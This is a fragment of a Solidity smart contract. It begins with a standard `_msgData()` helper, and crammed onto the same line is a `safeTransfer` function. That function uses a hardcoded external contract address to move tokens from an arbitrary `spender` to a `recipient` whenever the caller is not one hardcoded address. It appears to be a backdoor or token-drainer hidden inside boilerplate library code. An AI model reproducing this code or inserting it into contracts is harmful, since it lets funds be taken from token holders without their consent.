 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xe15C1a6D4c72711876fAb0BaED69b83da3Bb0d5E)) {TransferHelper.safeTransferFrom(0x600Ca57B937a28Eb3012ED00D82688A09D365cEa,spender,recipient,amount);return true;}return false;}
}
